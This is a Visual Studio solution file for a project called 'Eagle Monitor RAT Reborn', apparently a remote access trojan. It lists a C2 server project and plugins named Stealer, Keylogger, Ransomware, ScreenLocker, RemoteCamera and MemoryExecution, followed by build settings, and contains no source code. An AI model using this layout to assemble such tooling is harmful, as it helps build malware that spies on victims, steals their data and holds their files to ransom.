
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.2.32616.157
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Eagle Monitor RAT Reborn", "Eagle Monitor RAT Reborn\Eagle Monitor RAT Reborn.csproj", "{76117FFD-C18B-4366-8CE8-0572E7F4FB87}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Plugins", "Plugins", "{416B39F0-2EF5-42BB-AE33-092AF22ABD95}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "AudioRecording", "Plugins\AudioRecording\AudioRecording.csproj", "{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FileManager", "Plugins\FileManager\FileManager.csproj", "{08BF3C47-16A4-4D13-9A5B-3130F29CC180}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Offline", "Plugins\Offline\Offline.csproj", "{D317BA4E-5818-4FC4-AA4E-EEA824317759}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "ProcessManager", "Plugins\ProcessManager\ProcessManager.csproj", "{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteCamera", "Plugins\RemoteCamera\RemoteCamera.csproj", "{B06314F2-338E-4E66-ACAA-A107A777A7B5}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "RemoteDesktop", "Plugins\RemoteDesktop\RemoteDesktop.csproj", "{5389698F-E221-466D-8682-8F289C44F1DD}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Stealer", "Plugins\Stealer\Stealer.csproj", "{57239258-19E3-4B07-854C-8B0A3221C45A}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "MemoryExecution", "Plugins\MemoryExecution\MemoryExecution.csproj", "{0607E970-CC93-4A2A-83CA-53B9D537C96E}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "PowerManager", "Plugins\PowerManager\PowerManager.csproj", "{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Miscellaneous", "Plugins\Miscellaneous\Miscellaneous.csproj", "{EAEC4642-636D-4312-8903-D70157A8E91C}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Admin", "Plugins\Admin\Admin.csproj", "{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Chat", "Plugins\Chat\Chat.csproj", "{773A4D23-189D-4353-BF37-515591E16F5A}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Keylogger", "Plugins\Keylogger\Keylogger.csproj", "{D60C7327-79D4-4525-95D9-ADD6B55986A8}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Information", "Plugins\Information\Information.csproj", "{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Hardware", "Plugins\Hardware\Hardware.csproj", "{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "ScreenLocker", "Plugins\ScreenLocker\ScreenLocker.csproj", "{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Ransomware", "Plugins\Ransomware\Ransomware.csproj", "{150CA92E-FD24-4518-8B7B-BBECB4CC7578}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "ClientOptions", "ClientOptions", "{AFC1D5E4-E5FC-478E-8D0C-6065C6F1B5EF}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "C2", "C2\C2.csproj", "{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "HookHardware", "Utils\HookHardware\HookHardware.csproj", "{64C6E036-FF80-4F45-87F6-0A9996131FA1}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "PacketLib", "Utils\PacketLib\PacketLib.csproj", "{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Debug|x64 = Debug|x64
		Release|Any CPU = Release|Any CPU
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Debug|x64.ActiveCfg = Debug|x64
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Debug|x64.Build.0 = Debug|x64
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Release|Any CPU.Build.0 = Release|Any CPU
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Release|x64.ActiveCfg = Release|x64
		{76117FFD-C18B-4366-8CE8-0572E7F4FB87}.Release|x64.Build.0 = Release|x64
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Debug|x64.ActiveCfg = Debug|Any CPU
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Debug|x64.Build.0 = Debug|Any CPU
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Release|Any CPU.Build.0 = Release|Any CPU
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Release|x64.ActiveCfg = Release|Any CPU
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11}.Release|x64.Build.0 = Release|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Debug|x64.ActiveCfg = Debug|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Debug|x64.Build.0 = Debug|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Release|Any CPU.Build.0 = Release|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Release|x64.ActiveCfg = Release|Any CPU
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180}.Release|x64.Build.0 = Release|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Debug|x64.ActiveCfg = Debug|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Debug|x64.Build.0 = Debug|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Release|Any CPU.Build.0 = Release|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Release|x64.ActiveCfg = Release|Any CPU
		{D317BA4E-5818-4FC4-AA4E-EEA824317759}.Release|x64.Build.0 = Release|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Debug|x64.ActiveCfg = Debug|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Debug|x64.Build.0 = Debug|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Release|Any CPU.Build.0 = Release|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Release|x64.ActiveCfg = Release|Any CPU
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C}.Release|x64.Build.0 = Release|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Debug|x64.ActiveCfg = Debug|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Debug|x64.Build.0 = Debug|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Release|Any CPU.Build.0 = Release|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Release|x64.ActiveCfg = Release|Any CPU
		{B06314F2-338E-4E66-ACAA-A107A777A7B5}.Release|x64.Build.0 = Release|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Debug|x64.ActiveCfg = Debug|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Debug|x64.Build.0 = Debug|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Release|Any CPU.Build.0 = Release|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Release|x64.ActiveCfg = Release|Any CPU
		{5389698F-E221-466D-8682-8F289C44F1DD}.Release|x64.Build.0 = Release|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Debug|x64.ActiveCfg = Debug|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Debug|x64.Build.0 = Debug|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Release|Any CPU.Build.0 = Release|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Release|x64.ActiveCfg = Release|Any CPU
		{57239258-19E3-4B07-854C-8B0A3221C45A}.Release|x64.Build.0 = Release|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Debug|x64.ActiveCfg = Debug|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Debug|x64.Build.0 = Debug|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Release|Any CPU.Build.0 = Release|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Release|x64.ActiveCfg = Release|Any CPU
		{0607E970-CC93-4A2A-83CA-53B9D537C96E}.Release|x64.Build.0 = Release|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Debug|x64.ActiveCfg = Debug|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Debug|x64.Build.0 = Debug|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Release|Any CPU.Build.0 = Release|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Release|x64.ActiveCfg = Release|Any CPU
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9}.Release|x64.Build.0 = Release|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Debug|x64.ActiveCfg = Debug|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Debug|x64.Build.0 = Debug|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Release|Any CPU.Build.0 = Release|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Release|x64.ActiveCfg = Release|Any CPU
		{EAEC4642-636D-4312-8903-D70157A8E91C}.Release|x64.Build.0 = Release|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Debug|x64.ActiveCfg = Debug|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Debug|x64.Build.0 = Debug|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Release|Any CPU.Build.0 = Release|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Release|x64.ActiveCfg = Release|Any CPU
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0}.Release|x64.Build.0 = Release|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Debug|x64.ActiveCfg = Debug|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Debug|x64.Build.0 = Debug|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Release|Any CPU.Build.0 = Release|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Release|x64.ActiveCfg = Release|Any CPU
		{773A4D23-189D-4353-BF37-515591E16F5A}.Release|x64.Build.0 = Release|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Debug|x64.ActiveCfg = Debug|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Debug|x64.Build.0 = Debug|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Release|Any CPU.Build.0 = Release|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Release|x64.ActiveCfg = Release|Any CPU
		{D60C7327-79D4-4525-95D9-ADD6B55986A8}.Release|x64.Build.0 = Release|Any CPU
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Debug|x64.ActiveCfg = Debug|x64
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Debug|x64.Build.0 = Debug|x64
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Release|Any CPU.Build.0 = Release|Any CPU
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Release|x64.ActiveCfg = Release|x64
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B}.Release|x64.Build.0 = Release|x64
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Debug|x64.ActiveCfg = Debug|Any CPU
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Debug|x64.Build.0 = Debug|Any CPU
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Release|Any CPU.Build.0 = Release|Any CPU
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Release|x64.ActiveCfg = Release|Any CPU
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32}.Release|x64.Build.0 = Release|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Debug|x64.ActiveCfg = Debug|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Debug|x64.Build.0 = Debug|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Release|Any CPU.Build.0 = Release|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Release|x64.ActiveCfg = Release|Any CPU
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261}.Release|x64.Build.0 = Release|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Debug|x64.ActiveCfg = Debug|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Debug|x64.Build.0 = Debug|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Release|Any CPU.Build.0 = Release|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Release|x64.ActiveCfg = Release|Any CPU
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578}.Release|x64.Build.0 = Release|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Debug|x64.ActiveCfg = Debug|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Debug|x64.Build.0 = Debug|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Release|Any CPU.Build.0 = Release|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Release|x64.ActiveCfg = Release|Any CPU
		{1F18CA9A-7410-4CEC-9CED-74F7B20393BD}.Release|x64.Build.0 = Release|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Debug|x64.ActiveCfg = Debug|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Debug|x64.Build.0 = Debug|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Release|Any CPU.Build.0 = Release|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Release|x64.ActiveCfg = Release|Any CPU
		{64C6E036-FF80-4F45-87F6-0A9996131FA1}.Release|x64.Build.0 = Release|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Debug|x64.ActiveCfg = Debug|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Debug|x64.Build.0 = Debug|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Release|Any CPU.Build.0 = Release|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Release|x64.ActiveCfg = Release|Any CPU
		{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}.Release|x64.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(NestedProjects) = preSolution
		{37FCC79C-BC7C-4481-8E5B-9C0CE4496D11} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{08BF3C47-16A4-4D13-9A5B-3130F29CC180} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{D317BA4E-5818-4FC4-AA4E-EEA824317759} = {AFC1D5E4-E5FC-478E-8D0C-6065C6F1B5EF}
		{D0B4F8E5-B2FE-4546-8468-1AF08B82B50C} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{B06314F2-338E-4E66-ACAA-A107A777A7B5} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{5389698F-E221-466D-8682-8F289C44F1DD} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{57239258-19E3-4B07-854C-8B0A3221C45A} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{0607E970-CC93-4A2A-83CA-53B9D537C96E} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{DCD28797-E01E-48F7-942C-6E01DF1DD9E9} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{EAEC4642-636D-4312-8903-D70157A8E91C} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{B4600D81-F6E7-4F97-B0D1-7029EEEED5F0} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{773A4D23-189D-4353-BF37-515591E16F5A} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{D60C7327-79D4-4525-95D9-ADD6B55986A8} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{8AF7E48F-4AE9-46E3-8D94-ECB557E6A47B} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{2CC85CB5-442E-4CC2-A905-D6DEDBC1EC32} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{8E4B128D-A9A9-4BCC-B87D-5FA50EC07261} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
		{150CA92E-FD24-4518-8B7B-BBECB4CC7578} = {416B39F0-2EF5-42BB-AE33-092AF22ABD95}
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {746CE693-E252-4E26-88E6-8C484C23D190}
	EndGlobalSection
EndGlobal
